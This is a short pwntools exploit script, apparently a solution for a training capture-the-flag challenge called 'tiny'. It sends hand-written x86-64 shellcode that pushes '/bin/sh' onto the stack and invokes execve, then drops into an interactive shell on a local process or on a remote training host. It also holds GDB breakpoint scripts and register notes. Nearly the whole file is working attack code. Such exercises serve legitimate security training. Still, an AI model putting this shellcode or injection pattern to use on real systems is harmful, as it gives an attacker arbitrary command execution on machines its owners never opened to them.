from pwn import *
#xor esi, esi
#xor edx, edx
#syscall
s = """b cs_free
continue
finish
next
next
si
si
si

b"/bin/sh\0"
"""
COMMANDS = """
b main
continue
"""
shellcode = b"\x31\xC0\x50\xB0\x2F\x50\xB0\x62\x50\xB0\x69\x50\xB0\x6E\x50\xB0\x2F\x50\xB0\x73\x50\xB0\x68\x50\xB0\x00\x50\x6A\x3B\x58\x31\xF6\x31\xD2\x0F\x05"

#ncat --ssl back-to-shell.training.offensivedefensive.it 8080
if args.GDB:
    p = gdb.debug("./tiny" , gdbscript=COMMANDS)
elif args.REMOTE:
    p = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    p = process("./tiny")
p.send(shellcode)
p.interactive()

#0x40116e

#execve("/bin/sh\0", NULL, NULL)

#(rdi, rsi, rdx), r10, r8, r9
#const char *filename, const char *const *argv, const char *const *envp

0x7ffeeec9e500

c = """
push 0x3b
pop rax
xor esi, esi
xor edx, edx
syscall
"""